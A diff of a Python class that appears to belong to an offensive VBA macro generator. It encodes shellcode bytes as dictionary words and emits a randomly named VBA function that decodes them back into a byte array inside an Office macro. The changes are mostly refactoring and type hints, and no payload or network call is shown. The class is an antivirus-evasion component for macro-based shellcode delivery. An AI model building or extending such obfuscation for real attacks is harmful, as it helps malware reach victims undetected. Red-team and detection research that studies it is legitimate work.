@@ -1,10 +1,11 @@
 import random
 import string
 import time
+from vba.utils.formatters import dict_to_vba
 
 class DictObfuscate:
 
-    def __init__(self, arguments):
+    def __init__(self, arguments: dict) -> None:
         self.name = ''.join(random.SystemRandom().choice(string.ascii_uppercase) for _ in range(16))
         if 'seed' in arguments:
             self.rng = random.Random(arguments['seed'])
@@ -20,22 +21,26 @@ class DictObfuscate:
             self.dictdecode[word] = i
 
 
-    def imports(self):
+    def imports(self) -> list[str]:
         return []
 
-    def compilerOptions(self):
+    def compilerOptions(self) -> list[str]:
         return []
 
-    def codeblock(self):
+    def obfuscate(self, decoded: bytes) -> str:
+        encoded = ''
+        for i in range(0, len(decoded) - 1):
+            encoded += self.dictencode[decoded[i]] + ' '
+        encoded += self.dictencode[decoded[-1]]
+        return encoded
 
-        dictionary = f'Dim dictionary\n'
-        dictionary += f'\tDim dictionary = CreateObject("Scripting.Dictionary")\n'
+    def transformer(self, shellcodestring: str) -> str:
+        return shellcodestring.format(shellcode=f'{self.name}({{shellcode}})')
 
-        return """
-Private Function {name}(strData)
-    Dim dictionary
-    Set dictionary = CreateObject("Scripting.Dictionary")
-{dictionary}
+    def codeblock(self) -> str:
+        return f"""
+Private Function {self.name}(strData)
+    {dict_to_vba(self.dictdecode, 'dictionary')}
     Dim arrayLength as Long
     Dim outArray() As Byte
     
@@ -50,16 +55,6 @@ Private Function {name}(strData)
         outArray(i) = dictionary.Item(words(i))
     Next i
 
-    {name} = outArray
+    {self.name} = outArray
 End Function
-""".format(name = self.name, dictionary='\n'.join([f'\tdictionary.Add "{key}", {value}' for key, value in self.dictdecode.items()]))
-
-    def transformer(self, shellcodestring):
-        return shellcodestring.format(shellcode=f'{self.name}({{shellcode}})')
-
-    def obfuscate(self, decoded):
-        encoded = ''
-        for i in range(0, len(decoded) - 1):
-            encoded += self.dictencode[decoded[i]] + ' '
-        encoded += self.dictencode[decoded[-1]]
-        return encoded
+"""
